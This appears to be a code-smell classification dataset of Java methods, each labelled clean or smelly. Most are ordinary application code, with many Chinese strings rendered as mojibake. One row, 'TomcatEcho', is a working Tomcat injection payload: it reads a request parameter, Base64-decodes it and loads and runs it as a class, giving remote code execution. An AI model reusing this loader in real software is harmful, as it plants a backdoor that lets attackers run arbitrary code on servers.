  if (ValidateUtils.isNullOrLessThanZero(clusterPhyId)) {
    sb.append(""clusterPhyId涓嶅厑璁镐负绌烘垨灏忎簬0;"").append(""\t"");
  }
  if (ValidateUtils.isBlank(kafkaUserName)) {
    sb.append(""kafkaUserName涓嶅厑璁镐负绌�;"").append(""\t"");
  }
  if (ValidateUtils.isNull(aclOperation)) {
    sb.append(""aclOperation涓嶅厑璁镐负null;"").append(""\t"");
  }
  if (ValidateUtils.isNull(aclPermissionType)) {
    sb.append(""aclPermissionType涓嶅厑璁镐负null;"").append(""\t"");
  }
  if (ValidateUtils.isBlank(aclClientHost)) {
    sb.append(""aclClientHost涓嶅厑璁镐负绌�;"").append(""\t"");
  }
  if (ValidateUtils.isNull(resourceType)) {
    sb.append(""resourceType涓嶅厑璁镐负null;"").append(""\t"");
  }
  if (ValidateUtils.isBlank(resourceName)) {
    sb.append(""resourceName涓嶅厑璁镐负绌�;"").append(""\t"");
  }
  if (ValidateUtils.isNull(resourcePatternType)) {
    sb.append(""resourcePatternType涓嶅厑璁镐负null;"").append(""\t"");
  }
  if (sb.length() == 0) {
    return Result.buildSuc();
  }
  return Result.buildFromRSAndMsg(ResultStatus.PARAM_ILLEGAL,sb.toString());
}",0,Clean Code
"/** 
 * 鐢宠瘔宸插鐞�  鍙栨秷璁㈠崟
 * @param orderSn
 * @return
 * @throws InformationExpiredException
 */
@RequiresPermissions(""otc:appeal:cancel-order"") @RequestMapping(value=""cancel-order"") @Transactional(rollbackFor=Exception.class) public MessageResult cancelOrder(long appealId,String orderSn,@RequestParam(value=""banned"",defaultValue=""false"") boolean banned) throws InformationExpiredException {
  Appeal appeal=appealService.findOne(appealId);
  Assert.notNull(appeal,""鐢宠瘔鍗曚笉瀛樺湪"");
  Long initiatorId=appeal.getInitiatorId();
  Long associateId=appeal.getAssociateId();
  Order order=orderService.findOneByOrderSn(orderSn);
  notNull(order,msService.getMessage(""ORDER_NOT_EXISTS""));
  int ret=getRet(order,initiatorId,associateId);
  isTrue(ret != 0,msService.getMessage(""REQUEST_ILLEGAL""));
  isTrue(order.getStatus().equals(OrderStatus.NONPAYMENT) || order.getStatus().equals(OrderStatus.PAID) || order.getStatus().equals(OrderStatus.APPEAL),msService.getMessage(""ORDER_NOT_ALLOW_CANCEL""));
  if (!(orderService.cancelOrder(order.getOrderSn()) > 0)) {
    throw new InformationExpiredException(""Information Expired"");
  }
  MessageResult result=success("""");
  if (ret == 1) {
    Member member1=memberService.findOne(initiatorId);
    if (member1.getStatus() == CommonStatus.NORMAL && banned) {
      member1.setStatus(CommonStatus.ILLEGAL);
      memberService.save(member1);
    }
    result=cancel(order,order.getNumber(),associateId);
  }
 else   if (ret == 2) {
    Member member1=memberService.findOne(initiatorId);
    if (member1.getStatus() == CommonStatus.NORMAL && banned) {
      member1.setStatus(CommonStatus.ILLEGAL);
      memberService.save(member1);
    }
    result=cancel(order,add(order.getNumber(),order.getCommission()),associateId);
  }
 else   if (ret == 3) {
    Member member1=memberService.findOne(associateId);
    if (member1.getStatus() == CommonStatus.NORMAL && banned) {
      member1.setStatus(CommonStatus.ILLEGAL);
      memberService.save(member1);
    }
    result=cancel(order,add(order.getNumber(),order.getCommission()),initiatorId);
  }
 else   if (ret == 4) {
    Member member1=memberService.findOne(associateId);
    if (member1.getStatus() == CommonStatus.NORMAL && banned) {
      member1.setStatus(CommonStatus.ILLEGAL);
      memberService.save(member1);
    }
    result=cancel(order,order.getNumber(),initiatorId);
  }
 else {
    throw new InformationExpiredException(""Information Expired"");
  }
  appeal.setDealWithTime(DateUtil.getCurrentDate());
  appeal.setIsSuccess(BooleanEnum.IS_FALSE);
  appeal.setStatus(AppealStatus.PROCESSED);
  appealService.save(appeal);
  return result;
}",1,Code Smell
"private void openAddMember(){
  Bundle args=new Bundle();
  args.putBoolean(""addToGroup"",true);
  args.putLong(""chatId"",currentChat.id);
  GroupCreateActivity fragment=new GroupCreateActivity(args);
  fragment.setInfo(chatInfo);
  if (chatInfo != null && chatInfo.participants != null) {
    LongSparseArray<TLObject> users=new LongSparseArray<>();
    for (int a=0; a < chatInfo.participants.participants.size(); a++) {
      users.put(chatInfo.participants.participants.get(a).user_id,null);
    }
    fragment.setIgnoreUsers(users);
  }
  fragment.setDelegate((users,fwdCount) -> {
    HashSet<Long> currentParticipants=new HashSet<>();
    ArrayList<TLRPC.User> addedUsers=new ArrayList<>();
    if (chatInfo.participants.participants != null) {
      for (int i=0; i < chatInfo.participants.participants.size(); i++) {
        currentParticipants.add(chatInfo.participants.participants.get(i).user_id);
      }
    }
    getMessagesController().addUsersToChat(currentChat,ProfileActivity.this,users,fwdCount,user -> {
      addedUsers.add(user);
    }
,restrictedUser -> {
      for (int i=0; i < chatInfo.participants.participants.size(); i++) {
        if (chatInfo.participants.participants.get(i).user_id == restrictedUser.id) {
          chatInfo.participants.participants.remove(i);
          updateListAnimated(true);
          break;
        }
      }
    }
,() -> {
      int N=addedUsers.size();
      int[] finished=new int[1];
      for (int a=0; a < N; a++) {
        TLRPC.User user=addedUsers.get(a);
        if (!currentParticipants.contains(user.id)) {
          if (chatInfo.participants == null) {
            chatInfo.participants=new TLRPC.TL_chatParticipants();
          }
          if (ChatObject.isChannel(currentChat)) {
            TLRPC.TL_chatChannelParticipant channelParticipant1=new TLRPC.TL_chatChannelParticipant();
            channelParticipant1.channelParticipant=new TLRPC.TL_channelParticipant();
            channelParticipant1.channelParticipant.inviter_id=getUserConfig().getClientUserId();
            channelParticipant1.channelParticipant.peer=new TLRPC.TL_peerUser();
            channelParticipant1.channelParticipant.peer.user_id=user.id;
            channelParticipant1.channelParticipant.date=getConnectionsManager().getCurrentTime();
            channelParticipant1.user_id=user.id;
            chatInfo.participants.participants.add(channelParticipant1);
          }
 else {
            TLRPC.ChatParticipant participant=new TLRPC.TL_chatParticipant();
            participant.user_id=user.id;
            participant.inviter_id=getAccountInstance().getUserConfig().clientUserId;
            chatInfo.participants.participants.add(participant);
          }
          chatInfo.participants_count++;
          getMessagesController().putUser(user,false);
        }
      }
      updateListAnimated(true);
    }
);
  }
);
  presentFragment(fragment);
}",1,Code Smell
"public Pair<Runnable,Runnable> removeFolderTemporarily(final int filterId,final ArrayList<Long> chats){
  frozenDialogFilters=new ArrayList<>(dialogFilters);
  for (int i=0; i < frozenDialogFilters.size(); ++i) {
    DialogFilter f=frozenDialogFilters.get(i);
    if (f.id == filterId) {
      frozenDialogFilters.remove(i);
      i--;
    }
  }
  hiddenUndoChats.clear();
  if (chats != null) {
    hiddenUndoChats.addAll(chats);
  }
  final boolean hidChats=!hiddenUndoChats.isEmpty();
  getNotificationCenter().postNotificationName(NotificationCenter.dialogFiltersUpdated);
  if (hidChats) {
    getNotificationCenter().postNotificationName(NotificationCenter.dialogsNeedReload);
  }
  Runnable apply=() -> {
    for (int i=0; i < dialogFilters.size(); ++i) {
      DialogFilter f=dialogFilters.get(i);
      if (f.id == filterId) {
        dialogFilters.remove(i);
        i--;
      }
    }
    frozenDialogFilters=null;
    hiddenUndoChats.clear();
    getNotificationCenter().postNotificationName(NotificationCenter.dialogFiltersUpdated);
    if (hidChats) {
      getNotificationCenter().postNotificationName(NotificationCenter.dialogsNeedReload);
    }
  }
;
  Runnable undo=() -> {
    frozenDialogFilters=null;
    hiddenUndoChats.clear();
    getNotificationCenter().postNotificationName(NotificationCenter.dialogFiltersUpdated);
    if (hidChats) {
      getNotificationCenter().postNotificationName(NotificationCenter.dialogsNeedReload);
    }
  }
;
  return new Pair<>(apply,undo);
}",1,Code Smell
"public AlipayOpenPublicSettingCategoryQueryResponse getIndustry() throws Exception {
  java.util.Map<String,Object> runtime_=TeaConverter.buildMap(new TeaPair(""connectTimeout"",15000),new TeaPair(""readTimeout"",15000),new TeaPair(""retry"",TeaConverter.buildMap(new TeaPair(""maxAttempts"",0))));
  TeaRequest _lastRequest=null;
  long _now=System.currentTimeMillis();
  int _retryTimes=0;
  while (Tea.allowRetry((java.util.Map<String,Object>)runtime_.get(""retry""),_retryTimes,_now)) {
    if (_retryTimes > 0) {
      int backoffTime=Tea.getBackoffTime(runtime_.get(""backoff""),_retryTimes);
      if (backoffTime > 0) {
        Tea.sleep(backoffTime);
      }
    }
    _retryTimes=_retryTimes + 1;
    try {
      TeaRequest request_=new TeaRequest();
      java.util.Map<String,String> systemParams=TeaConverter.buildMap(new TeaPair(""method"",""alipay.open.public.setting.category.query""),new TeaPair(""app_id"",_getConfig(""appId"")),new TeaPair(""timestamp"",_getTimestamp()),new TeaPair(""format"",""json""),new TeaPair(""version"",""1.0""),new TeaPair(""alipay_sdk"",_getSdkVersion()),new TeaPair(""charset"",""UTF-8""),new TeaPair(""sign_type"",_getConfig(""signType"")),new TeaPair(""app_cert_sn"",_getMerchantCertSN()),new TeaPair(""alipay_root_cert_sn"",_getAlipayRootCertSN()));
      java.util.Map<String,Object> bizParams=new java.util.HashMap<>();
      java.util.Map<String,String> textParams=new java.util.HashMap<>();
      request_.protocol=_getConfig(""protocol"");
      request_.method=""POST"";
      request_.pathname=""/gateway.do"";
      request_.headers=TeaConverter.buildMap(new TeaPair(""host"",_getConfig(""gatewayHost"")),new TeaPair(""content-type"",""application/x-www-form-urlencoded;charset=utf-8""));
      request_.query=TeaConverter.merge(String.class,TeaConverter.buildMap(new TeaPair(""sign"",_sign(systemParams,bizParams,textParams,_getConfig(""merchantPrivateKey"")))),systemParams,textParams);
      request_.body=Tea.toReadable(_toUrlEncodedRequestBody(bizParams));
      _lastRequest=request_;
      TeaResponse response_=Tea.doAction(request_,runtime_);
      java.util.Map<String,Object> respMap=_readAsJson(response_,""alipay.open.public.setting.category.query"");
      if (_isCertMode()) {
        if (_verify(respMap,_extractAlipayPublicKey(_getAlipayCertSN(respMap)))) {
          return TeaModel.toModel(_toRespModel(respMap),new AlipayOpenPublicSettingCategoryQueryResponse());
        }
      }
 else {
        if (_verify(respMap,_getConfig(""alipayPublicKey""))) {
          return TeaModel.toModel(_toRespModel(respMap),new AlipayOpenPublicSettingCategoryQueryResponse());
        }
      }
      throw new TeaException(TeaConverter.buildMap(new TeaPair(""message"",""楠岀澶辫触锛岃妫�鏌ユ敮浠樺疂鍏挜璁剧疆鏄惁姝ｇ‘銆�"")));
    }
 catch (    Exception e) {
      if (Tea.isRetryable(e)) {
        continue;
      }
      throw e;
    }
  }
  throw new TeaUnretryableException(_lastRequest);
}",1,Code Smell
"public TomcatEcho(){
  try {
    String var3=null;
    boolean var5=false;
    Thread[] var6=(Thread[])getFV(Thread.currentThread().getThreadGroup(),""threads"");
    for (int var7=0; var7 < var6.length; ++var7) {
      Thread var8=var6[var7];
      if (var8 != null) {
        String var2=var8.getName();
        if (!var2.contains(""exec"") && var2.contains(""http"")) {
          Object var1=getFV(var8,""target"");
          if (var1 instanceof Runnable) {
            try {
              var1=getFV(getFV(getFV(var1,""this$0""),""handler""),""global"");
            }
 catch (            Exception var20) {
              continue;
            }
            List var10=(List)getFV(var1,""processors"");
            for (int var11=0; var11 < var10.size(); ++var11) {
              Object var12=var10.get(var11);
              var1=getFV(var12,""req"");
              Object var13=var1.getClass().getMethod(""getNote"",Integer.TYPE).invoke(var1,new Integer(1));
              var3=(String)var13.getClass().getMethod(""getParameter"",String.class).invoke(var13,new String(""user""));
              if (var3 != null && !var3.isEmpty()) {
                byte[] classBytes=Base64.decode(var3);
                java.lang.reflect.Method defineClassMethod=ClassLoader.class.getDeclaredMethod(""defineClass"",byte[].class,int.class,int.class);
                defineClassMethod.setAccessible(true);
                Class invoke=(Class)defineClassMethod.invoke(TomcatEcho.class.getClassLoader(),classBytes,0,classBytes.length);
                invoke.newInstance().equals(var13);
                var5=true;
              }
              if (var5) {
                break;
              }
            }
          }
        }
      }
    }
  }
 catch (  Exception var21) {
  }
}",1,Code Smell
"private void updateInCurrentThread(){
  if (quitFlag) {
    return;
  }
  long startMS=SystemClock.uptimeMillis();
  long d=syncTimer(startMS);
  if (d < 0 && !mNonBlockModeEnable) {
    removeMessages(UPDATE);
    sendEmptyMessageDelayed(UPDATE,60 - d);
    return;
  }
  d=mDanmakuView.drawDanmakus();
  removeMessages(UPDATE);
  if (d > mCordonTime2) {
    timer.add(d);
    mDrawTimes.clear();
  }
  if (!mDanmakusVisible) {
    waitRendering(INDEFINITE_TIME);
    return;
  }
 else   if (mRenderingState.nothingRendered && mIdleSleep) {
    long dTime=mRenderingState.endTime - timer.currMillisecond;
    if (dTime > 500) {
      waitRendering(dTime - 10);
      return;
    }
  }
  if (d < mFrameUpdateRate) {
    sendEmptyMessageDelayed(UPDATE,mFrameUpdateRate - d);
    return;
  }
  sendEmptyMessage(UPDATE);
}",1,Code Smell
"/** 
 * Write the complete index to the given output.  Features that do not have a supplier are assumed to have already been written by calls to writeInline.  The supplier takes node ordinals and returns FeatureState suitable for Feature.writeInline.
 */
public synchronized void write(Map<FeatureId,IntFunction<Feature.State>> featureStateSuppliers) throws IOException {
  if (graph instanceof OnHeapGraphIndex) {
    var ohgi=(OnHeapGraphIndex)graph;
    if (ohgi.getDeletedNodes().cardinality() > 0) {
      throw new IllegalArgumentException(""Run builder.cleanup() before writing the graph"");
    }
  }
  for (  var id : featureStateSuppliers.entrySet()) {
    if (!featureMap.containsKey(id.getKey())) {
      throw new IllegalArgumentException(""Feature supplier provided for feature not in the graph"");
    }
  }
  out.seek(startOffset);
  var graphSize=graph.size();
  var commonHeader=new CommonHeader(version,graphSize,dimension,view.entryNode(),graph.maxDegree());
  var header=new Header(commonHeader,featureMap);
  header.write(out);
  assert out.position() == startOffset + headerSize : String.format(""%d != %d"",out.position(),startOffset + headerSize);
  for (int newOrdinal=0; newOrdinal < graphSize; newOrdinal++) {
    var originalOrdinal=ordinalMapper.newToOld(newOrdinal);
    if (!graph.containsNode(originalOrdinal)) {
      var msg=String.format(""Ordinal mapper mapped new ordinal %s to non-existing node %s"",newOrdinal,originalOrdinal);
      throw new IllegalStateException(msg);
    }
    out.writeInt(newOrdinal);
    assert out.position() == featureOffsetForOrdinal(newOrdinal) : String.format(""%d != %d"",out.position(),featureOffsetForOrdinal(newOrdinal));
    for (    var feature : featureMap.values()) {
      var supplier=featureStateSuppliers.get(feature.id());
      if (supplier == null) {
        out.seek(out.position() + feature.inlineSize());
      }
 else {
        feature.writeInline(out,supplier.apply(originalOrdinal));
      }
    }
    var neighbors=view.getNeighborsIterator(originalOrdinal);
    if (neighbors.size() > graph.maxDegree()) {
      var msg=String.format(""Node %d has more neighbors %d than the graph's max degree %d -- run Builder.cleanup()!"",originalOrdinal,neighbors.size(),graph.maxDegree());
      throw new IllegalStateException(msg);
    }
    out.writeInt(neighbors.size());
    int n=0;
    for (; n < neighbors.size(); n++) {
      var newNeighborOrdinal=ordinalMapper.oldToNew(neighbors.nextInt());
      if (newNeighborOrdinal < 0 || newNeighborOrdinal >= graphSize) {
        var msg=String.format(""Neighbor ordinal out of bounds: %d/%d"",newNeighborOrdinal,graphSize);
        throw new IllegalStateException(msg);
      }
      out.writeInt(newNeighborOrdinal);
    }
    assert !neighbors.hasNext();
    for (; n < graph.maxDegree(); n++) {
      out.writeInt(-1);
    }
  }
}",1,Code Smell
"/** 
 * 鑾峰彇鍒嗙被鏁版嵁 + 棣栭〉鏈�杩戞洿鏂拌棰戝垪琛ㄦ暟鎹�
 * @param filter 鏄惁寮�鍚瓫閫� 鍏宠仈鐨勬槸 杞欢璁剧疆涓� 棣栭〉鏁版嵁婧愰噷鐨勭瓫閫夊紑鍏�
 * @return
 */
@Override public String homeContent(boolean filter){
  try {
    String url=siteUrl + '/';
    Document doc=Jsoup.parse(OkHttpUtil.string(url,getHeaders(url)));
    Elements elements=doc.select(""ul.nav-menu>li>a"");
    JSONArray classes=new JSONArray();
    ArrayList<String> allClass=new ArrayList<>();
    for (    Element ele : elements) {
      String name=ele.text();
      boolean show=!filter || (name.equals(""闆诲奖"") || name.equals(""鍔囬泦"") || name.equals(""缍滆棟"")|| name.equals(""鍕曟极""));
      if (allClass.contains(name))       show=false;
      if (show) {
        allClass.add(name);
        Matcher mather=regexCategory.matcher(ele.attr(""href""));
        if (!mather.find())         continue;
        String id=mather.group(1).trim();
        JSONObject jsonObject=new JSONObject();
        jsonObject.put(""type_id"",id);
        jsonObject.put(""type_name"",name);
        classes.put(jsonObject);
      }
    }
    JSONObject result=new JSONObject();
    if (filter) {
      result.put(""filters"",filterConfig);
    }
    result.put(""class"",classes);
    try {
      Elements list=doc.select(""div.col-lg-wide-75 > ul.myui-vodlist li div.myui-vodlist__box"");
      JSONArray videos=new JSONArray();
      for (int i=0; i < list.size(); i++) {
        Element vod=list.get(i);
        String title=vod.selectFirst("".title"").text();
        String cover=vod.selectFirst("".myui-vodlist__thumb"").attr(""data-original"");
        String remark=vod.selectFirst(""span.pic-text"").text();
        Matcher matcher=regexVid.matcher(vod.selectFirst("".myui-vodlist__thumb"").attr(""href""));
        if (!matcher.find())         continue;
        String id=matcher.group(1);
        JSONObject v=new JSONObject();
        v.put(""vod_id"",id);
        v.put(""vod_name"",title);
        v.put(""vod_pic"",cover);
        v.put(""vod_remarks"",remark);
        videos.put(v);
      }
      result.put(""list"",videos);
    }
 catch (    Exception e) {
      SpiderDebug.log(e);
    }
    return result.toString();
  }
 catch (  Exception e) {
    SpiderDebug.log(e);
  }
  return """";
}",1,Code Smell
"public static File findFileByName(File root,String findFileName,int maxLevel,Comparator<File> fileComparator){
  return findFileByName(root,findFileName,maxLevel,0,fileComparator);
}
private static File findFileByName(File rootFile,String findFileName,int maxLevel,int currentLevel,Comparator<File> fileComparator){
  if (findFileName == null) {
    return null;
  }
  if (findFileName.equals(rootFile.getName())) {
    return rootFile;
  }
  if (rootFile.isDirectory()) {
    final File[] files=rootFile.listFiles();
    if (files == null) {
      return null;
    }
    final List<File> fileList=Arrays.asList(files);
    if (fileComparator != null) {
      fileList.sort(fileComparator);
    }
    for (    File f : fileList) {
      if (maxLevel < 0 || currentLevel < maxLevel) {
        File file=findFileByName(f,findFileName,maxLevel,currentLevel + 1,fileComparator);
        if (file != null) {
          return file;
        }
      }
    }
  }
  return null;
}",1,Code Smell
"private void reloadFrames(int frameNum){
  if (mediaMetadataRetriever == null) {
    return;
  }
  if (frameNum == 0) {
    frameHeight=AndroidUtilities.dp(40);
    framesToLoad=Math.max(1,(getMeasuredWidth() - AndroidUtilities.dp(16)) / frameHeight);
    frameWidth=(int)Math.ceil((float)(getMeasuredWidth() - AndroidUtilities.dp(16)) / (float)framesToLoad);
    frameTimeOffset=videoLength / framesToLoad;
  }
  currentTask=new AsyncTask<Integer,Integer,Bitmap>(){
    private int frameNum=0;
    @Override protected Bitmap doInBackground(    Integer... objects){
      frameNum=objects[0];
      Bitmap bitmap=null;
      if (isCancelled()) {
        return null;
      }
      try {
        bitmap=mediaMetadataRetriever.getFrameAtTime(frameTimeOffset * frameNum * 1000,MediaMetadataRetriever.OPTION_CLOSEST_SYNC);
        if (isCancelled()) {
          return null;
        }
        if (bitmap != null) {
          Bitmap result=Bitmap.createBitmap(frameWidth,frameHeight,bitmap.getConfig());
          Canvas canvas=new Canvas(result);
          float scaleX=(float)frameWidth / (float)bitmap.getWidth();
          float scaleY=(float)frameHeight / (float)bitmap.getHeight();
          float scale=Math.max(scaleX,scaleY);
          int w=(int)(bitmap.getWidth() * scale);
          int h=(int)(bitmap.getHeight() * scale);
          Rect srcRect=new Rect(0,0,bitmap.getWidth(),bitmap.getHeight());
          Rect destRect=new Rect((frameWidth - w) / 2,(frameHeight - h) / 2,w,h);
          canvas.drawBitmap(bitmap,srcRect,destRect,null);
          bitmap.recycle();
          bitmap=result;
        }
      }
 catch (      Exception e) {
        FileLog.e(e);
      }
      return bitmap;
    }
    @Override protected void onPostExecute(    Bitmap bitmap){
      if (!isCancelled()) {
        frames.add(new BitmapFrame(bitmap));
        invalidate();
        if (frameNum < framesToLoad) {
          reloadFrames(frameNum + 1);
        }
      }
    }
  }
;
  currentTask.executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR,frameNum,null,null);
}",1,Code Smell
"private static void signPageTaskList(){
  try {
    String s=AntMemberRpcCall.signPageTaskList();
    JSONObject jo=new JSONObject(s);
    boolean doubleCheck=false;
    if (""SUCCESS"".equals(jo.getString(""resultCode""))) {
      if (!jo.has(""categoryTaskList"")) {
        return;
      }
      JSONArray categoryTaskList=jo.getJSONArray(""categoryTaskList"");
      for (int i=0; i < categoryTaskList.length(); i++) {
        jo=categoryTaskList.getJSONObject(i);
        if (!""BROWSE"".equals(jo.getString(""type"")))         continue;
        JSONArray taskList=jo.getJSONArray(""taskList"");
        for (int j=0; j < taskList.length(); j++) {
          JSONObject task=taskList.getJSONObject(j);
          int count=1;
          boolean hybrid=task.getBoolean(""hybrid"");
          int PERIOD_CURRENT_COUNT=0;
          int PERIOD_TARGET_COUNT=0;
          if (hybrid) {
            PERIOD_CURRENT_COUNT=Integer.parseInt(task.getJSONObject(""extInfo"").getString(""PERIOD_CURRENT_COUNT""));
            PERIOD_TARGET_COUNT=Integer.parseInt(task.getJSONObject(""extInfo"").getString(""PERIOD_TARGET_COUNT""));
            if (PERIOD_TARGET_COUNT > PERIOD_CURRENT_COUNT) {
              count=PERIOD_TARGET_COUNT - PERIOD_CURRENT_COUNT;
            }
 else {
              count=0;
            }
          }
          if (count > 0) {
            JSONObject taskConfigInfo=task.getJSONObject(""taskConfigInfo"");
            String name=taskConfigInfo.getString(""name"");
            Long id=taskConfigInfo.getLong(""id"");
            String awardParamPoint=taskConfigInfo.getJSONObject(""awardParam"").getString(""awardParamPoint"");
            String targetBusiness=taskConfigInfo.getJSONArray(""targetBusiness"").getString(0);
            for (int k=0; k < count; k++) {
              jo=new JSONObject(AntMemberRpcCall.applyTask(name,id));
              if (""SUCCESS"".equals(jo.getString(""resultCode""))) {
                Thread.sleep(1000);
                String[] targetBusinessArray=targetBusiness.split(""#"");
                jo=new JSONObject(AntMemberRpcCall.executeTask(targetBusinessArray[2],targetBusinessArray[1]));
                if (""SUCCESS"".equals(jo.getString(""resultCode""))) {
                  String ex="""";
                  if (hybrid) {
                    ex=""("" + Integer.toString(PERIOD_CURRENT_COUNT + k + 1) + ""/""+ PERIOD_TARGET_COUNT+ "")"";
                  }
                  Log.other(""浼氬憳浠诲姟馃帠锔廩"" + name + ex+ ""]#""+ awardParamPoint+ ""绉垎"");
                  doubleCheck=true;
                }
              }
            }
          }
        }
      }
      if (doubleCheck)       signPageTaskList();
    }
 else {
      Log.recordLog(jo.getString(""resultCode""),s);
    }
  }
 catch (  Throwable t) {
    Log.i(TAG,""signPageTaskList err:"");
    Log.printStackTrace(TAG,t);
  }
}",1,Code Smell
"/** 
 * Get Inlong-Manager IP list from the given proxy client config
 */
public static String getManagerIpList(ProxyClientConfig clientConfig){
  String managerAddress=clientConfig.getManagerAddress();
  if (StringUtils.isBlank(managerAddress)) {
    log.error(""ServiceDiscovery get managerIpList but managerAddress is blank, just return"");
    return null;
  }
  String managerIpList=getManagerIpListByHttp(managerAddress,clientConfig);
  if (StringUtils.isNotBlank(managerIpList)) {
    latestManagerIPList=managerIpList;
    return managerIpList;
  }
  log.error(""ServiceDiscovery get managerIpList from {} occur error, try to get from latestManagerIPList"",managerAddress);
  String[] managerIps=latestManagerIPList.split(arraySed);
  if (managerIps.length > 0) {
    for (    String managerIp : managerIps) {
      if (StringUtils.isBlank(managerIp)) {
        log.error(""ServiceDiscovery managerIp is null, latestManagerIPList is {}"",latestManagerIPList);
        continue;
      }
      String currentAddress=managerIp + "":"" + clientConfig.getManagerPort();
      managerIpList=getManagerIpListByHttp(currentAddress,clientConfig);
      if (StringUtils.isBlank(managerIpList)) {
        log.error(""ServiceDiscovery get latestManagerIPList from {} but got nothing, will try next ip"",managerIp);
        continue;
      }
      latestManagerIPList=managerIpList;
      return managerIpList;
    }
  }
 else {
    log.error(""ServiceDiscovery latestManagerIpList {} format error, or not contain ip"",latestManagerIPList);
  }
  String existedIpList=getLocalManagerIpList(clientConfig.getManagerIpLocalPath());
  if (StringUtils.isNotBlank(existedIpList)) {
    String[] existedIps=existedIpList.split(arraySed);
    if (existedIps.length > 0) {
      for (      String existedIp : existedIps) {
        if (StringUtils.isBlank(existedIp)) {
          log.error(""ServiceDiscovery get illegal format ipList from local file, "" + ""exist ip is empty, managerIpList is {}, local file is {}"",existedIpList,clientConfig.getManagerIpLocalPath());
          continue;
        }
        String currentAddress=existedIp + "":"" + clientConfig.getManagerPort();
        managerIpList=getManagerIpListByHttp(currentAddress,clientConfig);
        if (StringUtils.isBlank(managerIpList)) {
          log.error(""ServiceDiscovery get {} from local file {} but got nothing, will try next ip"",existedIp,clientConfig.getManagerIpLocalPath());
          continue;
        }
        latestManagerIPList=managerIpList;
        return managerIpList;
      }
    }
 else {
      log.error(""ServiceDiscovery get illegal format ipList from local file, "" + ""exist ip is empty, managerIpList is {}, local file is {}"",existedIpList,clientConfig.getManagerIpLocalPath());
    }
  }
 else {
    log.error(""ServiceDiscovery get empty ipList from local file {}"",clientConfig.getManagerIpLocalPath());
  }
  return managerIpList;
}",1,Code Smell
"/** 
 * Inverts a square matrix using gaussian elimination.
 * @return The inverse of the matrix.
 */
public Matrix invert(){
  if (data.length == 0 || data.length != data[0].length()) {
    throw new IllegalArgumentException(""matrix must be square"");
  }
  int N=data.length;
  var augmented=new Matrix(N,2 * N);
  for (int i=0; i < N; i++) {
    for (int j=0; j < N; j++) {
      augmented.set(i,j,get(i,j));
      augmented.set(i,j + N,(i == j) ? 1 : 0);
    }
  }
  for (int i=0; i < N; i++) {
    int maxRow=i;
    for (int k=i + 1; k < N; k++) {
      if (abs(augmented.get(k,i)) > abs(augmented.get(maxRow,i))) {
        maxRow=k;
      }
    }
    var temp=augmented.data[i];
    augmented.data[i]=augmented.data[maxRow];
    augmented.data[maxRow]=temp;
    VectorUtil.scale(augmented.data[i],1 / augmented.get(i,i));
    for (int k=0; k < N; k++) {
      if (k != i) {
        float factor=augmented.get(k,i);
        for (int j=0; j < 2 * N; j++) {
          augmented.addTo(k,j,-factor * augmented.get(i,j));
        }
      }
    }
  }
  var inverse=new Matrix(N,N);
  for (int i=0; i < N; i++) {
    inverse.data[i].copyFrom(augmented.data[i],N,0,N);
  }
  return inverse;
}",1,Code Smell
"default void setParam(PreparedStatement ps,int i,Object o) throws SQLException {
  if (o instanceof String) {
    setString(ps,i,(String)o);
  }
 else   if (o instanceof UUID) {
    setUUID(ps,i,(UUID)o);
  }
 else   if (o instanceof Integer) {
    setInt(ps,i,(Integer)o);
  }
 else   if (o instanceof Long) {
    setLong(ps,i,(Long)o);
  }
 else   if (o instanceof Double) {
    setDouble(ps,i,(Double)o);
  }
 else   if (o instanceof Boolean) {
    setBoolean(ps,i,(boolean)o);
  }
 else   if (o instanceof Instant) {
    setTimestamp(ps,i,(Instant)o);
  }
 else   if (o instanceof Duration) {
    setDuration(ps,i,(Duration)o);
  }
 else   if (o instanceof Enum) {
    setEnum(ps,i,(Enum)o);
  }
 else   if (o == null) {
    ps.setTimestamp(i,null);
  }
 else {
    throw new IllegalStateException(String.format(""Found a value which could not be set in the PreparedStatement: %s: %s"",o.getClass(),o));
  }
}
",0,Clean Code
"@SuppressWarnings(""rawtypes"") private static void loadFromResource(Class<?> c,ResourceType type,Int2ObjectMap map) throws Exception {
  int count=0;
  for (  String name : type.name()) {
    count+=loadFromResource(c,type,name,map);
  }
  LunarCore.getLogger().info(""Loaded "" + count + "" ""+ c.getSimpleName()+ ""s."");
}
@SuppressWarnings({""rawtypes"",""unchecked""}) private static <T>int loadFromResource(Class<T> c,ResourceType type,String fileName,Int2ObjectMap map) throws Exception {
  String file=LunarCore.getConfig().getResourceDir() + ""/ExcelOutput/"" + fileName;
  try (InputStreamReader fileReader=new InputStreamReader(new FileInputStream(file),StandardCharsets.UTF_8)){
    Stream<T> stream=null;
    JsonElement json=JsonParser.parseReader(fileReader);
    if (json.isJsonArray()) {
      List<T> excels=gson.fromJson(json,TypeToken.getParameterized(List.class,c).getType());
      stream=excels.stream();
    }
 else     if (json.isJsonObject()) {
      boolean isMap=true;
      var it=json.getAsJsonObject().asMap().entrySet().iterator();
      if (it.hasNext()) {
        var it2=it.next().getValue().getAsJsonObject().asMap().entrySet().iterator();
        String key=it2.next().getKey();
        try {
          Integer.parseInt(key);
          isMap=false;
        }
 catch (        Exception ex) {
        }
      }
      if (isMap) {
        Map<Integer,T> excels=gson.fromJson(json,TypeToken.getParameterized(Map.class,Integer.class,c).getType());
        stream=excels.values().stream();
      }
 else {
        Map<Integer,Map<Integer,T>> excels=gson.fromJson(json,TypeToken.getParameterized(Map.class,Integer.class,TypeToken.getParameterized(Map.class,Integer.class,c).getType()).getType());
        stream=excels.values().stream().flatMap(m -> m.values().stream());
      }
    }
 else {
      throw new Exception(""Invalid excel file: "" + fileName);
    }
    if (stream == null)     return 0;
    AtomicInteger count=new AtomicInteger();
    stream.forEach(o -> {
      GameResource res=(GameResource)o;
      res.onLoad();
      count.getAndIncrement();
      if (map != null) {
        map.put(res.getId(),res);
      }
    }
);
    if (map != null) {
      map.forEach((k,v) -> {
        if (v instanceof GameResource) {
          ((GameResource)v).onFinalize();
        }
      }
);
    }
    return count.get();
  }
 }",1,Code Smell
"@NonNull public static String getProtectionLevelString(PermissionInfo permissionInfo){
  int basePermissionType=PermissionInfoCompat.getProtection(permissionInfo);
  int permissionFlags=PermissionInfoCompat.getProtectionFlags(permissionInfo);
  String protectionLevel=""????"";
switch (basePermissionType) {
case PermissionInfo.PROTECTION_DANGEROUS:
    protectionLevel=""dangerous"";
  break;
case PermissionInfo.PROTECTION_NORMAL:
protectionLevel=""normal"";
break;
case PermissionInfo.PROTECTION_SIGNATURE:
protectionLevel=""signature"";
break;
